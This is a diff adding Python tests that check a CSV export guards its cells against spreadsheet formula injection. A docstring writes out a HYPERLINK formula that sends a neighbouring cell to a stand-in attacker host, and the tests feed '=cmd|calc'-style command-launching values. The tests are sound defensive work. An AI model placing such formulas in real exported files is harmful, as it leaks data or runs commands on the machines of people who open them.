@@ -420,3 +420,73 @@ def test_the_csv_carries_the_decision():
     assert "owner" in out.splitlines()[0]
     assert "Engineering" in out
     assert "2027-01-01" in out
+
+
+# ─────────────────────────────────────────────
+# Exports a spreadsheet will not execute
+# ─────────────────────────────────────────────
+
+class TestCsvIsNotExecutable:
+    """A CSV export is opened in Excel, and Excel runs formulas.
+
+    csv handles commas and quotes and has no opinion about formulas, because
+    they are not a CSV concept. Every major spreadsheet evaluates a cell
+    starting with = + - or @, so a device named
+
+        =HYPERLINK("http://attacker/"&A1)
+
+    exfiltrates the row beside it when somebody opens the file. Device names,
+    usernames and tool ids all come from reporting sources, and the register is
+    exported precisely so it can be handed to somebody in a spreadsheet.
+    """
+
+    def test_a_formula_is_prefixed(self):
+        from app.derive import csv_safe
+
+        assert csv_safe('=HYPERLINK("http://x")').startswith("'")
+
+    def test_every_dangerous_lead_character(self):
+        from app.derive import csv_safe
+
+        for lead in ("=", "+", "-", "@"):
+            assert csv_safe(lead + "SUM(A1)").startswith("'"), lead
+
+    def test_leading_whitespace_does_not_hide_it(self):
+        """The spreadsheet strips the whitespace and runs what is left.
+
+        A first version tested the string with the whitespace already removed,
+        so a value beginning with a tab was only caught when the character
+        after the tab was also dangerous. A leading tab is itself the problem.
+        """
+        from app.derive import csv_safe
+
+        for value in ("\t=cmd", "\r=cmd", " =cmd", "\n=cmd", "\tcmd"):
+            assert csv_safe(value).startswith("'"), repr(value)
+
+    def test_ordinary_values_are_untouched(self):
+        """The export still has to be readable. A prefix on every cell would be
+        safe and useless."""
+        from app.derive import csv_safe
+
+        for value in ("chatgpt", "a=b", "OpenAI", "2026-08-12", ""):
+            assert csv_safe(value) == value, repr(value)
+
+    def test_the_register_export_guards_its_cells(self):
+        from app.derive import register_csv, register_from
+
+        rows = [r for r in register_from(
+            [_f(tool="=cmd|calc", device="D1")], {}, {}) if r["observed"]]
+        out = register_csv(rows)
+
+        assert "'=cmd|calc" in out
+        assert "\n=cmd" not in out
+
+    def test_a_list_field_is_guarded_after_joining(self):
+        """surfaces and sources are joined with semicolons before writing, so
+        the guard has to run on the joined string rather than the parts."""
+        from app.derive import register_csv, register_from
+
+        rows = [r for r in register_from(
+            [_f(surface="=cmd")], {}, {}) if r["observed"]]
+
+        assert "'=cmd" in register_csv(rows)
